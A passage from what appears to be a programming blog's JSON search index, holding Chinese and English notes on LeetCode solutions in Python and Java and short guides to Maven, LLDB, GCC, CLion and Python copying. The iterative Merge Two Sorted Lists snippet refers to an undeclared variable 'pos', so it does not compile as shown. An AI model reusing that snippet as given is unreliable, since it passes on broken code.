1);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breadth-first Search","slug":"Breadth-first-Search","permalink":"http://larryim.cc/tags/Breadth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"20. Valid Parentheses","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-20-Valid-Parentheses/","text":"题目Given a string containing just the characters (, ), {, }, [ and ], determine if the input string is valid. The brackets must close in the correct order, () and ()[]{} are all valid but (] and `([)] are not. 中文题目判断一个只包含各种括号符号的字符串中括号的匹配情况。注意点： 字符串中只会包含(, ), [, ], {, }这些字符括号匹配要注意顺序，字符串([)]是错误的匹配例子： 输入: s=”(){}” 输出: True输入: s=”(){}[“ 输出: False 思路典型的用栈来解决的问题，遇到左括号就压栈，遇到右括号时如果栈为空（类似]]]的情况），则失败，否则取栈顶元素，看两个括号是否匹配。如果最后栈不为空（类似[[[的情况），则匹配失败。 1234567891011121314151617181920212223class Solution: def isValid(self, s): \"\"\" :type s: str :rtype: bool \"\"\" chardict = &#123;'(':')', '[':']', '&#123;':'&#125;'&#125; n = len(s) stack = [] for i in range(n): inchar = s[i] if (inchar == '(') or (inchar == '&#123;') or (inchar =='['): stack.append(inchar) else: if len(stack) == 0: return False outchar = stack.pop() if inchar != chardict[outchar]: return False if len(stack) &gt; 0: return False return True Your runtime beats 100.00 % of python3 submissions.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"string","slug":"string","permalink":"http://larryim.cc/tags/string/"},{"name":"stack","slug":"stack","permalink":"http://larryim.cc/tags/stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"198. House Robber","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-198-House-Robber/","text":"You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and it will automatically contact the police if two adjacent houses were broken into on the same night. Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police. Example 1: 1234Input: [1,2,3,1]Output: 4Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3). Total amount you can rob = 1 + 3 = 4. Example 2: 1234Input: [2,7,9,3,1]Output: 12Explanation: Rob house 1 (money = 2), rob house 3 (money = 9) and rob house 5 (money = 1). Total amount you can rob = 2 + 9 + 1 = 12. Java这道题目和Maximum weight independent set of path graph一摸一样！真是佩服出题人，能改编成这样。 题目中的不能抢相邻的房间，相当于构建一个独立集。要求抢的物品价值最高，相当于构建一个最大独立集。 1234567public int rob(int[] nums) &#123; int[] totals = new int[nums.length + 2]; for (int i = 2; i &lt; totals.length; i++) totals[i] = Math.max(nums[i - 2] + totals[i - 2], totals[i - 1]); return totals[totals.length - 1]; &#125; 可以舍去中间结果： 123456789public int rob(int[] nums) &#123; int last = 0, secondLast = 0, cur = 0; for (int i = 0; i &lt; nums.length; i++) &#123; cur = Math.max(nums[i] + secondLast, last); secondLast = last; last = cur; &#125; return cur; &#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"203. Remove Linked List Elements","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-203-Remove-Linked-List-Elements/","text":"Remove all elements from a linked list of integers that have value val. Example: 12Input: 1-&gt;2-&gt;6-&gt;3-&gt;4-&gt;5-&gt;6, val = 6Output: 1-&gt;2-&gt;3-&gt;4-&gt;5 Java 一一比对节点元素，然后删除匹配元素，需要注意的是删除匹配的头部元素，采取两种方案 直接删除头部元素 加入dummynode，将头部元素按正常元素处理 结果是第一种方法快，但是代码量比较多。 12345678910111213141516public ListNode removeElements(ListNode head, int val) &#123; if(head == null) return null; // 处理头部元素 while (head.val == val) &#123; head = head.next; if (head == null) return null; &#125; // 正常节点 ListNode pos = head; while (pos.next != null) if (pos.next.val == val) pos.next = pos.next.next; else pos = pos.next; return head;&#125; 对于头部元素的删除，采用另一种更加简便的方法： 加入dummy node 12345678910public ListNode removeElementsUsingDummy(ListNode head, int val) &#123; ListNode dummy = new ListNode(0); dummy.next = head; ListNode pos = dummy; while (pos.next != null) if (pos.next.val == val) pos.next = pos.next.next; else pos = pos.next; return dummy.next;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"Maven","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/TOOLS-Maven/","text":"Maven is a build tool which automatically manages dependencies, source C compilation, test compilation, and test execution. Compiling with Maven from the Command LineIf you wish to compile the source C using Maven from the command line, simply issue the following command from the command line from inside the root directory: 1$ mvn compile Compiling with Maven from IntelliJGo to File &gt; New &gt; Project from Existing Sources... and select the root directory. You should receive an “Import Project” prompt like the one shown below. Select the “Import project from external model” radio button, select “Maven” from the list below, and click through the following prompts to complete the import. Open the Maven Projects pane by navigating to “View &gt; Tool Windows &gt; Maven Projects”. 一个基本maven项目的pom.xml配置第一部分,项目坐标，信息描述等 1234567&lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;&lt;groupId&gt;com.company.project&lt;/groupId&gt;&lt;artifactId&gt;module&lt;/artifactId&gt;&lt;packaging&gt;war&lt;/packaging&gt;&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;&lt;name&gt;test Maven Webapp&lt;/name&gt;&lt;url&gt;http://maven.apache.org&lt;/url&gt; modelVersion：pom文件的模型版本 关于group id和artifact id，为了便于多人多模块协同开发管理（以后会讲），建议使用以下命名规范 group id：com.公司名.项目名 artifact id：功能模块名 packaging：项目打包的后缀，war是web项目发布用的，默认为jar version: artifact模块的版本 name和url：相当于项目描述，可删除 group id + artifact id +version :项目在仓库中的坐标 第二部分,引入jar包 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-csv&lt;/artifactId&gt; &lt;version&gt;1.5&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 上面引入了Apache commons csv项目，可以在官网找到Maven设置。 dependency：引入资源jar包到本地仓库，要引入更多资源就在中继续增加 group id+artifact id+version：资源jar包在仓库中的坐标 scope：作用范围，test指该jar包仅在maven测试时使用，发布时会忽略这个包。需要发布的jar包可以忽略这一配置 第三部分,构建项目 12345678910111213141516171819202122&lt;build&gt; &lt;finalName&gt;helloworld&lt;/finalName&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.5.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.7&lt;/source&gt; &lt;target&gt;1.7&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;configuration&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; build：项目构建时的配置 finalName：在浏览器中的访问路径，如果将它改成helloworld，再执行maven–update，这时运行项目的访问路径是 http://localhost:8080/helloworld/, 而不是项目名的 http://localhost:8080/test plugins：插件，之前篇章已经说过，第一个插件是用来设置java版本为1.7，第二个插件是我刚加的，用来设置编码为utf-8 group id+artifact id+version：插件在仓库中的坐标 configuration：设置插件的参数值 本地仓库运行机制：","tags":[{"name":"Java","slug":"Java","permalink":"http://larryim.cc/tags/Java/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"LLDB使用","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/TOOLS-LLDB使用/","text":"lldb是一个开源的下一代高性能调试器。LLDB是MAC上的默认调试器，支持调试C、Objective-C和C++语言。 可以比较LLDB与GDB命令的对照表。 命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980调试器命令: apropos -- 列出与单词或主题相关的调试器命令 breakpoint -- 在断点上操作的命令 (详情使用&apos;help b&apos;查看) bugreport -- 用于创建指定域的错误报告 command -- 用于管理自定义LLDB命令的命令 disassemble -- 拆分当前目标中的特定说明。 默认为当前线程和堆栈帧的当前函数 expression -- 求当前线程上的表达式的值。 以LLDB默认格式显示返回的值 frame -- 用于选择和检查当前线程的堆栈帧的命令 gdb-remote -- 通过远程GDB服务器连接到进程。 如果未指定主机，则假定为localhost gui -- 切换到基于curses的GUI模式 help -- 显示所有调试器命令的列表，或提供指定命令的详细信息 kdp-remote -- 通过远程KDP服务器连接到进程。 如果没有指定UDP端口，则假定端口41139 language -- 指定源语言 log -- 控制LLDB内部日志记录的命令 memory -- 用于在当前目标进程的内存上操作的命令 platform -- 用于管理和创建平台的命令 plugin -- 用于管理LLDB插件的命令 process -- 用于与当前平台上的进程交互的命令 quit -- 退出LLDB调试器 register -- 命令访问当前线程和堆栈帧的寄存器 script -- 使用提供的代码调用脚本解释器并显示任何结果。 如果没有提供代码，启动交互式解释器。 settings -- 用于管理LLDB设置的命令 source -- 检查当前目标进程的调试信息所描述的源代码的命令 target -- 用于在调试器目标上操作的命令 thread -- 用于在当前进程中的一个或多个线程上操作的命令 type -- 在类型系统上操作的命令 version -- 显示LLDB调试器版本 watchpoint -- 在观察点上操作的命令 缩写命令 (使用 &apos;help command alias&apos;查看更多信息): add-dsym -- (&apos;target symbols add&apos;) 通过指定调试符号文件的路径，或使用选项指定下载符号的模块，将调试符号文件添加到目标的当前模块中的一个 attach -- (&apos;_regexp-attach&apos;) 通过ID或名称附加到进程 b -- (&apos;_regexp-break&apos;) 使用几种简写格式之一设置断点 bt -- (&apos;_regexp-bt&apos;) 显示当前线程的调用堆栈。通过数字参数设置最多显示帧数。参数“all”显示所有线程 c -- (&apos;process continue&apos;) 继续执行当前进程中的所有线程 call -- (&apos;expression --&apos;) 计算当前线程上的表达式,使用LLDB的默认格式显示返回的值 continue -- (&apos;process continue&apos;) 继续执行当前进程中的所有线程 detach -- (&apos;process detach&apos;) 脱离当前目标进程 di -- (&apos;disassemble&apos;) 拆分当前目标中的特定说明。 默认为当前线程和堆栈帧的当前函数 dis -- (&apos;disassemble&apos;) 同上 display -- (&apos;_regexp-display&apos;) 在每次停止时计算表达式（请参阅&apos;help target stop-hook&apos;） down -- (&apos;_regexp-down&apos;) 选择一个新的堆栈帧。默认为移动一个帧，数字参数可以指定值 env -- (&apos;_regexp-env&apos;) 查看和设置环境变量的简写 exit -- (&apos;quit&apos;) 退出LLDB调试器 f -- (&apos;frame select&apos;) 从当前线程中通过索引选择当前堆栈帧（参见&apos;thread backtrace&apos;） file -- (&apos;target create&apos;) 使用参数作为主要可执行文件创建目标 finish -- (&apos;thread step-out&apos;) 完成当前堆栈帧的执行并返回后停止。 默认为当前线程 image -- (&apos;target modules&apos;) 用于访问一个或多个目标模块的信息的命令 j -- (&apos;_regexp-jump&apos;) 将程序计数器设置为新地址 jump -- (&apos;_regexp-jump&apos;) 同上 kill -- (&apos;process kill&apos;) 终止当前目标进程 l -- (&apos;_regexp-list&apos;) 使用几种简写格式之一列出相关的源代码 list -- (&apos;_regexp-list&apos;) 同上 n -- (&apos;thread step-over&apos;) 源级单步执行、步进调用，默认当前线程 next -- (&apos;thread step-over&apos;) 同上 nexti -- (&apos;thread step-inst-over&apos;) 指令级单步执行、步进调用，默认当前线程 ni -- (&apos;thread step-inst-over&apos;) 同上 p -- (&apos;expression --&apos;) 计算当前线程上表达式的值，以LLDB默认格式显示返回值 parray -- (&apos;expression -Z %1 --&apos;) 同上 po -- 计算当前线程上的表达式。显示由类型作者控制的格式的返回值。 poarray -- (&apos;expression -O -Z %1 --&apos;) 计算当前线程上表达式的值，以LLDB默认格式显示返回值 print -- (&apos;expression --&apos;) 同上 q -- (&apos;quit&apos;) 退出LLDB调试器 r -- (&apos;process launch -X true --&apos;) 在调试器中启动可执行文件 rbreak -- (&apos;breakpoint set -r %1&apos;) 在可执行文件中设置断点或断点集 repl -- (&apos;expression -r -- &apos;) E计算当前线程上表达式的值，以LLDB默认格式显示返回值 run -- (&apos;process launch -X true --&apos;) 在调试器中启动可执行文件 s -- (&apos;thread step-in&apos;) 源级单步执行、步进调用，默认当前线程 si -- (&apos;thread step-inst&apos;) 指令级单步执行、步进调用，默认当前线程 sif -- 遍历当前块，如果直接步入名称与TargetFunctionName匹配的函数，则停止 step -- (&apos;thread step-in&apos;) 源级单步执行、步进调用，默认当前线程 stepi -- (&apos;thread step-inst&apos;) 指令级单步执行、步进调用，默认当前线程 t -- (&apos;thread select&apos;) 更改当前选择的线程 tbreak -- (&apos;_regexp-tbreak&apos;) 使用几种简写格式之一设置单次断点 undisplay -- (&apos;_regexp-undisplay&apos;) 每次停止时停止显示表达式（由stop-hook索引指定） up -- (&apos;_regexp-up&apos;) 选择较早的堆栈帧。 默认为移动一个帧，数值参数可以指定任意数字 x -- (&apos;memory read&apos;) 从当前目标进程的内存中读取 LLDB语法LLDB的基本语法如下： 1&lt;command&gt; [&lt;subcommand&gt; [&lt;subcommand&gt;...]] &lt;action&gt; [-options [option-value]] [argument [argument...]] 例如： 123456789breakpoint set -f test.m -l 18command: breakpoint 添加断点命令action: set 表示设置断点option: -f 表示在某文件添加断点arguement: test.m表示要添加断点的文件名为test.moption: -l 表示某一行arguement: 18 表示第18行 expressionexpression命令的作用是执行一个表达式，并将表达式返回的结果输出: 1expression &lt;cmd-options&gt; -- &lt;expr&gt;","tags":[{"name":"LLDB","slug":"LLDB","permalink":"http://larryim.cc/tags/LLDB/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"谈谈Python中的拷贝","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Python-谈谈Python中的拷贝/","text":"可变和不可变对象为了解释Python中的拷贝，首先要弄清楚Python中的对象分为可变和不可变对象。在Python中的每一个对象都可以分为不可变immutable或者可变mutable。对于Python核心数据类型，其分类如下： 可变： 列表，字典 不可变： 数字，字符串，元组 赋值赋值并不拷贝。 Assignment statements in Python do not copy objects, they create bindings between a target and an object. For collections that are mutable or contain mutable items, a copy is sometimes needed so one can change one copy without changing the other.(Python官方文档) 深拷贝和浅拷贝来自copy模块的两个函数 copy.copy() 浅拷贝 copy.deepcopy() 深拷贝 The difference between shallow and deep copying is only relevant for compound objects (objects that contain other objects, like lists or class instances): A shallow copy constructs a new compound object and then (to the extent possible) inserts references into it to the objects found in the original.A deep copy constructs a new compound object and then, recursively, inserts copies into it of the objects found in the original. 常见类型拷贝 dict.copy() 返回一个字典的浅复制。 list.copy() 返回一个列表的浅复制。","tags":[{"name":"Python","slug":"Python","permalink":"http://larryim.cc/tags/Python/"},{"name":"Copy","slug":"Copy","permalink":"http://larryim.cc/tags/Copy/"}],"categories":[{"name":"Python","slug":"Python","permalink":"http://larryim.cc/categories/Python/"}]},{"title":"GCC","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/TOOLS-GCC/","text":"头文件C头文件有两种形式: #include &lt;&gt;直接到系统指定的目录中寻找 #inlude &quot;&quot;首先在源文件所在文件夹查找，然后再到系统指定的某些目录中去找某些头文件。 gcc -I 头文件所在文件夹(绝对路径或相对路径均可) 源文件","tags":[{"name":"gcc","slug":"gcc","permalink":"http://larryim.cc/tags/gcc/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"207. Course Schedule","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-207-Course-Schedule/","text":"There are a total of $n$ courses you have to take, labeled from 0 to $n-1$. Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1] Given the total number of courses and a list of prerequisite pairs, is it possible for you to finish all courses? Example 1: 1234Input: 2, [[1,0]] Output: trueExplanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So it is possible. Example 2: 12345Input: 2, [[1,0],[0,1]]Output: falseExplanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0, and to take course 0 you should also have finished course 1. So it is impossible. Note: The input prerequisites is a graph represented by a list of edges, not adjacency matrices. You may assume that there are no duplicate edges in the input prerequisites. JavaDFS的常见应用。检查有向图是不是DAG，即有没有环。详见Algorithms 4th，思路很简单，如果在遍历了$v-&gt;w$时，发现$w$在栈上，那么说明肯定有环，因为既然$w$在栈上，说明肯定有一条路径使得$w-&gt;v$。 123456789101112131415161718192021222324252627282930private boolean hasCycle;public boolean canFinish(int numCourses, int[][] prerequisites) &#123; hasCycle = false; // construct a graph List&lt;List&lt;Integer&gt;&gt; graph = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; numCourses; i++) graph.add(new ArrayList&lt;Integer&gt;()); for (int[] prerequisite : prerequisites) graph.get(prerequisite[1]).add(prerequisite[0]); // dfs boolean[] mark = new boolean[numCourses]; boolean[] onStack = new boolean[numCourses]; for (int v = 0; v &lt; numCourses; v++) if (!hasCycle &amp; !mark[v]) dfs(graph, mark, onStack, v); return !hasCycle;&#125; private void dfs(List&lt;List&lt;Integer&gt;&gt; graph, boolean[] mark, boolean[] onStack, int v) &#123; mark[v] = true; onStack[v] = true; for (int w : graph.get(v)) &#123; if (!hasCycle &amp; !mark[w]) dfs(graph, mark, onStack, w); else if (onStack[w]) hasCycle = true; &#125; onStack[v] = false;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"},{"name":"Topological Sort","slug":"Topological-Sort","permalink":"http://larryim.cc/tags/Topological-Sort/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"206. Reverse Linked List","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-206-Reverse-Linked-List/","text":"Reverse a singly linked list. Example: 12Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULLOutput: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL Follow up: A linked list can be reversed either iteratively or recursively. Could you implement both? Java 这里使用三种方法，都是可以通过的。 栈： 将链表节点依次放入栈，然后依次取出并连接，非常慢。 利用迭代，依次获取后面的反转链表，然后将反转链表指向该元素，比较慢。 将后面的元素依次与前面的元素连接起来，这种方法最快。 使用栈反转链表 12345678910111213141516171819public ListNode ReverseList(ListNode head) &#123; if ((head == null) || (head.next == null)) return head; // 获得节点 Stack&lt;ListNode&gt; stack = new Stack&lt;&gt;(); while (head.next != null) &#123; stack.push(head); head = head.next; &#125; // 后面的节点指向前面的节点 ListNode res = head; while (!stack.isEmpty()) &#123; head.next = stack.pop(); head = head.next; &#125; // 尾部设置为null head.next = null; return res;&#125; 类似于1，只不过将栈表示为函数调用栈： 123456789101112public ListNode ReverseList(ListNode head) &#123; // base case if ((head == null) || (head.next == null)) return head; // 反转后面的节点 ListNode res = ReverseList(head.next); // 反转第1个节点 head.next.next = head; // 尾部设置为null head.next = null; return res;&#125; 将前面节点存储起来，让当前节点指向前面节点。 如果把当前节点$i$指向前一个节点$h$，会导致无法找到下一个节点$j$，所以需要将下一个节点$j$、前一个节点$i$保存起来。 1234567891011121314151617181920212223242526272829/** * While you are traversing the list, * change the current node's next pointer to point to its previous element. * Since a node does not have reference to its previous node, * you must store its previous element beforehand. * You also need another pointer to store the next node before changing the reference. * Do not forget to return the new head reference at the end! */public ListNode ReverseList(ListNode head) &#123; if (head == null || head.next == null) return head; ListNode cur = head.next; // 当前节点 ListNode prev = head; // 前面节点 ListNode next; // 下一个节点 while (cur.next != null) &#123; // 反转当前节点和前一个节点： 将当前节点指向前一个节点 next = cur.next; // 保存下一个节点，备用 cur.next = prev; // 反转 prev = cur; // 保存前一个节点，备用 cur = next; // 更新当前节点 &#125; // 反转最后一个节点 cur.next = prev; // 设置链表末尾 head.next = null; return cur;&#125; 也可以将后面的后面的节点存储起来，将后面的节点指向当前节点。含义完全和上述方法相同。 12345678910111213public ListNode ReverseList(ListNode head) &#123; if (head == null || head.next == null) return head; ListNode cur = head, next = cur.next, nextNext; while (next != null) &#123; nextNext = next.next; // 将头部节点的下一个节点设为null if (cur == head) cur.next = null; next.next = cur; cur = next; next = nextNext; &#125; return cur;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"Clion","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/TOOLS-Clion/","text":"Clion 可以申请学生版。个人感觉是mac上体验最棒的C++ IDE，比vscode强多了。 调试step into：单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数）； step over：在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试,在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行）。 step out：当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数。","tags":[{"name":"Cpp","slug":"Cpp","permalink":"http://larryim.cc/tags/Cpp/"}],"categories":[{"name":"TOOLS","slug":"TOOLS","permalink":"http://larryim.cc/categories/TOOLS/"}]},{"title":"100. Same Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-100-Same-Tree/","text":"Given two binary trees, write a function to check if they are the same or not. Two binary trees are considered the same if they are structurally identical and the nodes have the same value. Example 1:1234567Input: 1 1 / \\ / \\ 2 3 2 3 [1,2,3], [1,2,3]Output: true Example 2: 1234567Input: 1 1 / \\ 2 2 [1,2], [1,null,2]Output: false Example 3: 1234567Input: 1 1 / \\ / \\ 2 1 1 2 [1,2,1], [1,1,2]Output: false Java最初想到的就是一一比对二叉树的根节点、左节点和右节点，如果发现不想等的地方，则返回false； 1234567891011121314151617181920212223242526public boolean isSameTree(TreeNode p, TreeNode q) &#123; if (p == null || q == null) return p == q; Queue&lt;TreeNode&gt; queueP = new LinkedList&lt;&gt;(), queueQ = new LinkedList&lt;&gt;(); queueP.add(p); queueQ.add(q); while (!queueP.isEmpty() &amp;&amp; !queueQ.isEmpty()) &#123; if (queueP.peek().val != queueQ.peek().val) return false; TreeNode curP = queueP.poll(), curQ = queueQ.poll(); if (curP.left == null) &#123; if (curQ.left != null) return false; &#125; else &#123; queueP.add(curP.left); queueQ.add(curQ.left); &#125; if (curP.right == null) &#123; if (curQ.right != null) return false; &#125; else &#123; queueP.add(curP.right); queueQ.add(curQ.right); &#125; &#125; return queueP.isEmpty() &amp;&amp; queueQ.isEmpty();&#125; 然后写了个递归版本： 1234567public boolean isSameTree(TreeNode p, TreeNode q) &#123; if (p == null || q == null) return p == q; if (p.val != q.val) return false; if (!isSameTree(p.left, q.left)) return false; if (!isSameTree(p.right, q.right)) return false; return true;&#125; 递归真的是太简洁了！！！！而且运算时间还快！对于树的题目来说，还是写递归好。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"210. Course Schedule II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-210-Course-Schedule-II/","text":"There are a total of $n$ courses you have to take, labeled from 0 to $n-1$. Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1] Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses. There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array. Example 1: 12345Input: 2, [[1,0]] Output: [0,1]Explanation: There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1]. Example 2: 1234567Input: 4, [[1,0],[2,0],[3,1],[3,2]]Output: [0,1,2,3] or [0,2,1,3]Explanation: There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is [0,2,1,3] . Note: The input prerequisites is a graph represented by a list of edges, not adjacency matrices. You may assume that there are no duplicate edges in the input prerequisites. Java这题意思非常简单：给出上课顺序。这道题目是207. Course Schedule的延伸，前者只需要判断所有课程是否可以完成，现在需要给出完成的顺序。那么第一步肯定是用dfs来判断课程是否可以完成，那么怎么给出顺序呢？拓扑排序。有先决条件限制的规划问题(precedence-constrained scheduling problem)是拓扑排序的典型应用。拓扑排序其实就是dfs后序的逆序(reverse postOrder)。所以可以将拓扑排序和环的判断同时进行。 123456789101112131415161718192021222324252627282930313233343536373839private boolean hasCycle;public int[] findOrder(int numCourses, int[][] prerequisites) &#123; hasCycle = false; // construct a graph List&lt;List&lt;Integer&gt;&gt; graph = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; numCourses; i++) graph.add(new ArrayList&lt;Integer&gt;()); for (int[] prerequisite : prerequisites) graph.get(prerequisite[1]).add(prerequisite[0]); // dfs boolean[] mark = new boolean[numCourses]; boolean[] onStack = new boolean[numCourses]; List&lt;Integer&gt; postOrder = new ArrayList(); for (int v = 0; v &lt; numCourses; v++) if (!hasCycle &amp; !mark[v]) dfs(graph, mark, onStack, postOrder, v); // impossible to finish all course if (hasCycle) return new int[]&#123;&#125;; // get reversePostOrder int [] reverePostOrder = new int[numCourses]; for (int i = 0; i &lt; numCourses; i++) reverePostOrder[i] = postOrder.get(numCourses - i - 1); return reverePostOrder;&#125; private void dfs(List&lt;List&lt;Integer&gt;&gt; graph, boolean[] mark, boolean[] onStack, List&lt;Integer&gt; postOrder, int v) &#123; mark[v] = true; onStack[v] = true; for (int w : graph.get(v)) &#123; if (!hasCycle &amp; !mark[w]) dfs(graph, mark, onStack, postOrder, w); else if (onStack[w]) hasCycle = true; &#125; onStack[v] = false; postOrder.add(v);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Graph","slug":"Graph","permalink":"http://larryim.cc/tags/Graph/"},{"name":"Topological Sort","slug":"Topological-Sort","permalink":"http://larryim.cc/tags/Topological-Sort/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"21. Merge Two Sorted Lists","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-21-Merge-Two-Sorted-Lists/","text":"Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists. 1234Example:Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 Java合并排过序的链表。采用两个指针分别指向两个链表，依次比较这两个指针所指向的元素。将较小的元素放在最终链表中，并向后移动较小元素对应的链表，直到遍历到链表末尾。 最终，截取剩余的节点到最终链表末尾。 采用循环遍历的方法： 123456789101112131415public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; ListNode head = new ListNode(0), cur = head; while ((l1!=null) &amp;&amp; (l2!= null)) &#123; if (l1.val &lt; l2.val) &#123; cur.next = l1; l1 = l1.next; &#125; else &#123; cur.next = l2; l2 = l2.next; &#125; pos = pos.next; &#125; cur.next = (l1 == null) ? l2 : l1; return head.next;&#125; 采用递归的方法 1234567891011121314151617public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; // base case if (l1 == null) return l2; if (l2 == null) return l1; // current node ListNode res; if (l1.val &lt; l2.val) &#123; res = l1; l1 = l1.next; &#125; else &#123; res = l2; l2 = l2.next; &#125; // current node + nodes continued res.next = mergeTwoLists(l1, l2); return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"215. Kth Largest Element in an 